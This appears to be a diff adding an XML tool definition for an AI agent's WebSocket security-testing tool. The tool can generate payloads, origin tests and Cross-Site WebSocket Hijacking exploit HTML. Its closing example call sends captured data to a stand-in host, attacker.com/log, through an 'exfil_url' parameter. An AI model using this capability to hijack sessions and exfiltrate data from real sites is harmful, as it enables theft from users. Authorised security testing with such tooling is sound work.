@@ -1,0 +1,57 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<tools>
+  <tool name="websocket_client">
+    <description>WebSocket security testing utilities.</description>
+    <details>Common Use Cases:
+      - Analyze WebSocket URL and provide testing guidance
+      - Generate WebSocket testing payloads
+      - Generate origin testing guidance
+      - Generate Cross-Site WebSocket Hijacking (CSWSH) exploit HTML</details>
+    <parameters>
+      <parameter name="action" type="string" required="true">
+        <description>The WebSocket action:
+          - connect_info: Analyze WebSocket URL and provide testing guidance
+          - generate_payloads: Generate WebSocket testing payloads
+          - test_origin: Generate origin testing guidance
+          - generate_exploit: Generate CSWSH exploit HTML</description>
+      </parameter>
+      <parameter name="ws_url" type="string" required="false">
+        <description>WebSocket URL to test (wss:// or ws://). Required for connect_info, generate_exploit.</description>
+      </parameter>
+      <parameter name="origin" type="string" required="false">
+        <description>Origin to test (for test_origin action)</description>
+      </parameter>
+      <parameter name="exfil_url" type="string" required="false">
+        <description>URL for data exfiltration. Required for generate_exploit.</description>
+      </parameter>
+    </parameters>
+    <returns type="Dict[str, Any]">
+      <description>Testing payloads, exploit code, or analysis results</description>
+    </returns>
+    <examples>
+      # Analyze WebSocket URL
+      <function=websocket_client>
+      <parameter=action>connect_info</parameter>
+      <parameter=ws_url>wss://example.com/ws</parameter>
+      </function>
+
+      # Generate payloads
+      <function=websocket_client>
+      <parameter=action>generate_payloads</parameter>
+      </function>
+
+      # Test origin validation
+      <function=websocket_client>
+      <parameter=action>test_origin</parameter>
+      <parameter=origin>target.com</parameter>
+      </function>
+
+      # Generate CSWSH exploit
+      <function=websocket_client>
+      <parameter=action>generate_exploit</parameter>
+      <parameter=ws_url>wss://target.com/ws</parameter>
+      <parameter=exfil_url>https://attacker.com/log</parameter>
+      </function>
+    </examples>
+  </tool>
+</tools>
